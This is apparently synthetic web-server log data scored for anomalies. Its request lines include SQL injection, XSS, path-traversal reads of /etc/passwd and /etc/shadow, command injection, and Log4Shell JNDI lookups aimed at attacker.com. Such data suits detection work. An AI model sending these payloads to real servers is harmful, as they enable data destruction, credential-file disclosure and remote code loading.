score_content,score_session,score_fused,score_fused_norm,line
24.049436569213867,,24.049436569213867,24.049436569213867,45.29.96.201 - - [10/Jan/2025:12:00:37 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 10006 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.733808517456055,,4.733808517456055,4.733808517456055,40.49.88.237 - - [10/Jan/2025:12:00:37 +0100] "GET /admin HTTP/1.1" 304 16485 "https://twitter.com/" "nikto/2.5.0"
2.9123878479003906,,2.9123878479003906,2.9123878479003906,211.252.241.133 - - [10/Jan/2025:12:00:39 +0100] "GET /assets/app.css HTTP/1.1" 304 3319 "https://www.google.com/" "sqlmap/1.5.10#stable"
24.053199768066406,,24.053199768066406,24.053199768066406,30.2.80.239 - - [10/Jan/2025:12:00:40 +0100] "GET /search?q=camera HTTP/1.1" 200 17216 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3176725208759308,,0.3176725208759308,0.3176725208759308,6.148.195.80 - - [10/Jan/2025:12:00:40 +0100] "GET /wp-login.php HTTP/1.1" 200 10339 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.225793838500977,,24.225793838500977,24.225793838500977,172.31.70.39 - - [10/Jan/2025:12:00:41 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 14554 "https://example.com/" "curl/7.68.0"
0.350495845079422,,0.350495845079422,0.350495845079422,141.82.70.37 - - [10/Jan/2025:12:00:41 +0100] "GET /.git/config HTTP/1.1" 200 11579 "https://twitter.com/" "python-requests/2.31.0"
24.051916122436523,,24.051916122436523,24.051916122436523,139.114.13.34 - - [10/Jan/2025:12:00:42 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 201 11199 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.6040010452270508,,0.6040010452270508,0.6040010452270508,101.46.181.153 - - [10/Jan/2025:12:00:47 +0100] "GET /.env HTTP/1.1" 200 14074 "https://twitter.com/" "nikto/2.5.0"
26.523578643798828,,26.523578643798828,26.523578643798828,21.250.237.194 - - [10/Jan/2025:12:00:49 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 302 17581 "https://twitter.com/" "nikto/2.5.0"
0.22117994725704193,,0.22117994725704193,0.22117994725704193,176.165.182.197 - - [10/Jan/2025:12:00:50 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 10270 "https://news.ycombinator.com/" "nikto/2.5.0"
30124.060546875,,30124.060546875,30124.060546875,67.234.94.101 - - [10/Jan/2025:12:00:51 +0100] "GET /assets/app.css HTTP/1.1" 401 1263 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0185625553131104,,2.0185625553131104,2.0185625553131104,90.123.119.217 - - [10/Jan/2025:12:00:53 +0100] "GET /admin HTTP/1.1" 200 3799 "https://example.com/" "curl/7.68.0"
0.23230485618114471,,0.23230485618114471,0.23230485618114471,210.183.204.28 - - [10/Jan/2025:12:00:55 +0100] "GET /../../etc/passwd HTTP/1.1" 200 13393 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.060894012451172,,24.060894012451172,24.060894012451172,152.106.62.159 - - [10/Jan/2025:12:01:00 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 13233 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.016990661621094,,24.016990661621094,24.016990661621094,209.178.152.111 - - [10/Jan/2025:12:01:01 +0100] "GET /search?q=laptop HTTP/1.1" 200 6923 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
23.866832733154297,,23.866832733154297,23.866832733154297,190.239.183.147 - - [10/Jan/2025:12:01:03 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 2652 "-" "nikto/2.5.0"
24.05695152282715,,24.05695152282715,24.05695152282715,46.79.245.104 - - [10/Jan/2025:12:01:07 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 14688 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.5583295226097107,,0.5583295226097107,0.5583295226097107,24.56.210.36 - - [10/Jan/2025:12:01:07 +0100] "GET /.env HTTP/1.1" 200 2114 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.078516006469727,,24.078516006469727,24.078516006469727,115.51.53.175 - - [10/Jan/2025:12:01:12 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 19037 "https://example.com/" "sqlmap/1.5.10#stable"
30125.82421875,,30125.82421875,30125.82421875,184.252.235.89 - - [10/Jan/2025:12:01:16 +0100] "GET /logout HTTP/1.1" 404 890 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30124.404296875,,30124.404296875,30124.404296875,16.95.231.141 - - [10/Jan/2025:12:01:16 +0100] "GET /.env HTTP/1.1" 401 602 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.964630126953125,,23.964630126953125,23.964630126953125,222.8.61.111 - - [10/Jan/2025:12:01:21 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 9347 "https://example.com/" "dirb/2.22"
0.5775473117828369,,0.5775473117828369,0.5775473117828369,170.45.122.36 - - [10/Jan/2025:12:01:26 +0100] "GET /.env HTTP/1.1" 200 7021 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
30125.6640625,,30125.6640625,30125.6640625,74.224.172.33 - - [10/Jan/2025:12:01:29 +0100] "GET /profile HTTP/1.1" 400 315 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.875370502471924,,2.875370502471924,2.875370502471924,169.112.250.254 - - [10/Jan/2025:12:01:29 +0100] "GET /../../etc/passwd HTTP/1.1" 302 16048 "-" "curl/7.68.0"
30125.470703125,,30125.470703125,30125.470703125,155.239.109.160 - - [10/Jan/2025:12:01:30 +0100] "GET /server-status HTTP/1.1" 401 1424 "https://news.ycombinator.com/" "curl/7.68.0"
0.21011289954185486,,0.21011289954185486,0.21011289954185486,48.109.155.2 - - [10/Jan/2025:12:01:34 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 7497 "https://www.google.com/" "nikto/2.5.0"
30125.591796875,,30125.591796875,30125.591796875,94.9.251.10 - - [10/Jan/2025:12:01:39 +0100] "GET /server-status HTTP/1.1" 404 1180 "https://example.com/" "nikto/2.5.0"
1.8945209980010986,,1.8945209980010986,1.8945209980010986,252.220.252.193 - - [10/Jan/2025:12:01:39 +0100] "GET /phpmyadmin HTTP/1.1" 200 17349 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.8400417566299438,,1.8400417566299438,1.8400417566299438,176.163.139.205 - - [10/Jan/2025:12:01:43 +0100] "GET /phpmyadmin HTTP/1.1" 200 2658 "https://twitter.com/" "python-requests/2.31.0"
2.2842540740966797,,2.2842540740966797,2.2842540740966797,232.121.147.188 - - [10/Jan/2025:12:01:43 +0100] "GET / HTTP/1.1" 200 16898 "https://news.ycombinator.com/" "curl/7.68.0"
1.977218508720398,,1.977218508720398,1.977218508720398,178.237.153.192 - - [10/Jan/2025:12:01:45 +0100] "GET /logout HTTP/1.1" 200 1257 "https://twitter.com/" "curl/7.68.0"
24.27275848388672,,24.27275848388672,24.27275848388672,14.169.254.75 - - [10/Jan/2025:12:01:47 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 18871 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30125.580078125,,30125.580078125,30125.580078125,65.34.158.72 - - [10/Jan/2025:12:01:50 +0100] "GET /phpmyadmin HTTP/1.1" 401 569 "https://example.com/" "python-requests/2.31.0"
30124.255859375,,30124.255859375,30124.255859375,169.115.95.207 - - [10/Jan/2025:12:01:50 +0100] "GET /assets/app.js HTTP/1.1" 404 309 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.7736923694610596,,2.7736923694610596,2.7736923694610596,88.252.22.248 - - [10/Jan/2025:12:01:55 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 304 1184 "https://twitter.com/" "curl/7.68.0"
26.69877815246582,,26.69877815246582,26.69877815246582,170.113.186.164 - - [10/Jan/2025:12:01:56 +0100] "GET /search?q=phone HTTP/1.1" 304 7897 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9648972749710083,,1.9648972749710083,1.9648972749710083,194.210.30.14 - - [10/Jan/2025:12:02:00 +0100] "GET /profile HTTP/1.1" 200 8763 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.889129638671875,,26.889129638671875,26.889129638671875,60.98.175.181 - - [10/Jan/2025:12:02:03 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 302 17549 "https://news.ycombinator.com/" "dirb/2.22"
1.802280068397522,,1.802280068397522,1.802280068397522,98.174.81.247 - - [10/Jan/2025:12:02:05 +0100] "GET /server-status HTTP/1.1" 200 14806 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.7817795276641846,,1.7817795276641846,1.7817795276641846,86.70.69.206 - - [10/Jan/2025:12:02:09 +0100] "GET /server-status HTTP/1.1" 200 9032 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.8875463008880615,,2.8875463008880615,2.8875463008880615,188.173.151.198 - - [10/Jan/2025:12:02:14 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 304 8023 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.1196976974606514,,0.1196976974606514,0.1196976974606514,173.3.213.18 - - [10/Jan/2025:12:02:16 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 446 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.21776828169822693,,0.21776828169822693,0.21776828169822693,65.50.9.7 - - [10/Jan/2025:12:02:16 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 9383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30148.455078125,,30148.455078125,30148.455078125,32.182.246.31 - - [10/Jan/2025:12:02:20 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 429 1306 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30124.001953125,,30124.001953125,30124.001953125,48.65.76.120 - - [10/Jan/2025:12:02:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 403 1424 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8712111711502075,,1.8712111711502075,1.8712111711502075,71.199.16.98 - - [10/Jan/2025:12:02:23 +0100] "GET /dashboard HTTP/1.1" 200 2524 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.1798038482666,,24.1798038482666,24.1798038482666,126.251.238.52 - - [10/Jan/2025:12:02:23 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2374 "https://www.google.com/" "dirb/2.22"
0.23507770895957947,,0.23507770895957947,0.23507770895957947,56.158.165.28 - - [10/Jan/2025:12:02:28 +0100] "GET /../../etc/passwd HTTP/1.1" 200 14231 "https://example.com/" "nikto/2.5.0"
1.863426685333252,,1.863426685333252,1.863426685333252,199.115.5.230 - - [10/Jan/2025:12:02:28 +0100] "GET /phpmyadmin HTTP/1.1" 200 8311 "https://www.google.com/" "nikto/2.5.0"
2.926650047302246,,2.926650047302246,2.926650047302246,39.180.85.232 - - [10/Jan/2025:12:02:33 +0100] "GET /wp-login.php HTTP/1.1" 301 8830 "https://twitter.com/" "dirb/2.22"
24.255931854248047,,24.255931854248047,24.255931854248047,217.187.200.208 - - [10/Jan/2025:12:02:33 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 13335 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.269268035888672,,24.269268035888672,24.269268035888672,240.254.92.86 - - [10/Jan/2025:12:02:34 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 17640 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.8746708631515503,,1.8746708631515503,1.8746708631515503,21.216.118.195 - - [10/Jan/2025:12:02:34 +0100] "GET /phpmyadmin HTTP/1.1" 200 11243 "https://www.google.com/" "python-requests/2.31.0"
0.5833683609962463,,0.5833683609962463,0.5833683609962463,179.100.230.28 - - [10/Jan/2025:12:02:35 +0100] "GET /.env HTTP/1.1" 204 9893 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
26.623023986816406,,26.623023986816406,26.623023986816406,10.50.7.185 - - [10/Jan/2025:12:02:35 +0100] "GET /search?q=camera HTTP/1.1" 302 4685 "https://www.google.com/" "python-requests/2.31.0"
24.066057205200195,,24.066057205200195,24.066057205200195,248.5.10.87 - - [10/Jan/2025:12:02:38 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 14822 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.36889562010765076,,0.36889562010765076,0.36889562010765076,118.241.174.223 - - [10/Jan/2025:12:02:43 +0100] "GET /.git/config HTTP/1.1" 200 17241 "https://twitter.com/" "curl/7.68.0"
3.029900550842285,,3.029900550842285,3.029900550842285,168.5.121.233 - - [10/Jan/2025:12:02:44 +0100] "GET /index.html HTTP/1.1" 302 16120 "-" "python-requests/2.31.0"
0.2336292266845703,,0.2336292266845703,0.2336292266845703,232.79.211.204 - - [10/Jan/2025:12:02:45 +0100] "GET /assets/app.css HTTP/1.1" 200 1737 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30125.580078125,,30125.580078125,30125.580078125,30.128.153.205 - - [10/Jan/2025:12:02:49 +0100] "GET /phpmyadmin HTTP/1.1" 400 217 "-" "Wget/1.20.3 (linux-gnu)"
0.6188094615936279,,0.6188094615936279,0.6188094615936279,140.36.83.215 - - [10/Jan/2025:12:02:50 +0100] "GET /.env HTTP/1.1" 200 18973 "-" "Wget/1.20.3 (linux-gnu)"
1.8481124639511108,,1.8481124639511108,1.8481124639511108,194.107.44.179 - - [10/Jan/2025:12:02:54 +0100] "GET /phpmyadmin HTTP/1.1" 200 4728 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.32522690296173096,,0.32522690296173096,0.32522690296173096,200.41.5.226 - - [10/Jan/2025:12:02:55 +0100] "GET /wp-login.php HTTP/1.1" 200 12425 "-" "nikto/2.5.0"
4.528069496154785,,4.528069496154785,4.528069496154785,228.73.107.178 - - [10/Jan/2025:12:02:55 +0100] "GET /phpmyadmin HTTP/1.1" 302 19555 "https://www.google.com/" "nikto/2.5.0"
24.222700119018555,,24.222700119018555,24.222700119018555,62.241.45.157 - - [10/Jan/2025:12:02:56 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 13601 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0426082611083984,,2.0426082611083984,2.0426082611083984,90.108.2.143 - - [10/Jan/2025:12:02:57 +0100] "GET /about HTTP/1.1" 201 9969 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9935966730117798,,1.9935966730117798,1.9935966730117798,130.57.119.198 - - [10/Jan/2025:12:02:57 +0100] "GET /contact HTTP/1.1" 201 17785 "https://www.google.com/" "sqlmap/1.5.10#stable"
3.0389397144317627,,3.0389397144317627,3.0389397144317627,128.46.41.172 - - [10/Jan/2025:12:02:59 +0100] "GET /.git/config HTTP/1.1" 304 15645 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
23.886430740356445,,23.886430740356445,23.886430740356445,158.207.228.195 - - [10/Jan/2025:12:03:04 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 11054 "-" "nikto/2.5.0"
0.26269006729125977,,0.26269006729125977,0.26269006729125977,125.132.30.19 - - [10/Jan/2025:12:03:04 +0100] "GET /assets/app.js HTTP/1.1" 200 1052 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7884361743927002,,1.7884361743927002,1.7884361743927002,59.200.29.84 - - [10/Jan/2025:12:03:08 +0100] "GET /server-status HTTP/1.1" 200 10772 "-" "Wget/1.20.3 (linux-gnu)"
1.8781406879425049,,1.8781406879425049,1.8781406879425049,19.121.150.125 - - [10/Jan/2025:12:03:09 +0100] "GET /api/products HTTP/1.1" 200 7330 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2286921888589859,,0.2286921888589859,0.2286921888589859,35.118.185.50 - - [10/Jan/2025:12:03:10 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 12338 "https://example.com/" "sqlmap/1.5.10#stable"
2.9002113342285156,,2.9002113342285156,2.9002113342285156,72.35.29.219 - - [10/Jan/2025:12:03:11 +0100] "GET /wp-login.php HTTP/1.1" 301 2054 "https://news.ycombinator.com/" "nikto/2.5.0"
24.039915084838867,,24.039915084838867,24.039915084838867,155.41.203.204 - - [10/Jan/2025:12:03:14 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 9771 "https://twitter.com/" "curl/7.68.0"
2.068556070327759,,2.068556070327759,2.068556070327759,126.221.56.152 - - [10/Jan/2025:12:03:18 +0100] "GET /about HTTP/1.1" 200 17197 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
4.4064741134643555,,4.4064741134643555,4.4064741134643555,64.84.112.149 - - [10/Jan/2025:12:03:20 +0100] "GET /server-status HTTP/1.1" 302 8182 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
2.230369806289673,,2.230369806289673,2.230369806289673,11.254.121.188 - - [10/Jan/2025:12:03:21 +0100] "GET / HTTP/1.1" 200 1549 "-" "python-requests/2.31.0"
26.880504608154297,,26.880504608154297,26.880504608154297,116.127.62.22 - - [10/Jan/2025:12:03:24 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 304 3311 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.0211238861084,,24.0211238861084,24.0211238861084,5.123.172.79 - - [10/Jan/2025:12:03:25 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 3073 "https://news.ycombinator.com/" "curl/7.68.0"
11038.37890625,,11038.37890625,11038.37890625,198.36.224.181 - - [10/Jan/2025:12:03:29 +0100] "GET / HTTP/1.1" 500 949 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30125.818359375,,30125.818359375,30125.818359375,99.229.177.86 - - [10/Jan/2025:12:03:31 +0100] "GET /admin HTTP/1.1" 401 144 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.528712749481201,,4.528712749481201,4.528712749481201,159.226.86.189 - - [10/Jan/2025:12:03:34 +0100] "GET /api/products HTTP/1.1" 304 2752 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3240151107311249,,0.3240151107311249,0.3240151107311249,120.159.11.94 - - [10/Jan/2025:12:03:39 +0100] "GET /wp-login.php HTTP/1.1" 200 12079 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.8571661710739136,,1.8571661710739136,1.8571661710739136,36.252.86.62 - - [10/Jan/2025:12:03:44 +0100] "GET /phpmyadmin HTTP/1.1" 200 6808 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.507383346557617,,4.507383346557617,4.507383346557617,83.91.230.69 - - [10/Jan/2025:12:03:49 +0100] "GET /api/products HTTP/1.1" 302 7487 "https://news.ycombinator.com/" "python-requests/2.31.0"
23.987462997436523,,23.987462997436523,23.987462997436523,129.135.213.32 - - [10/Jan/2025:12:03:51 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 16032 "https://twitter.com/" "nikto/2.5.0"
2.014173746109009,,2.014173746109009,2.014173746109009,205.173.243.178 - - [10/Jan/2025:12:03:56 +0100] "GET /logout HTTP/1.1" 200 12163 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30124.482421875,,30124.482421875,30124.482421875,246.245.20.28 - - [10/Jan/2025:12:03:59 +0100] "GET /.env HTTP/1.1" 403 590 "https://example.com/" "curl/7.68.0"
24.23126220703125,,24.23126220703125,24.23126220703125,134.244.161.6 - - [10/Jan/2025:12:03:59 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 6793 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.23388008773326874,,0.23388008773326874,0.23388008773326874,114.189.166.6 - - [10/Jan/2025:12:04:04 +0100] "GET /../../etc/passwd HTTP/1.1" 200 13866 "https://www.google.com/" "python-requests/2.31.0"
30147.236328125,,30147.236328125,30147.236328125,166.86.106.149 - - [10/Jan/2025:12:04:04 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 400 1064 "https://example.com/" "sqlmap/1.5.10#stable"
0.24857650697231293,,0.24857650697231293,0.24857650697231293,34.230.203.79 - - [10/Jan/2025:12:04:07 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 18687 "https://example.com/" "curl/7.68.0"
26.67487335205078,,26.67487335205078,26.67487335205078,38.91.73.117 - - [10/Jan/2025:12:04:08 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 304 1650 "https://twitter.com/" "curl/7.68.0"
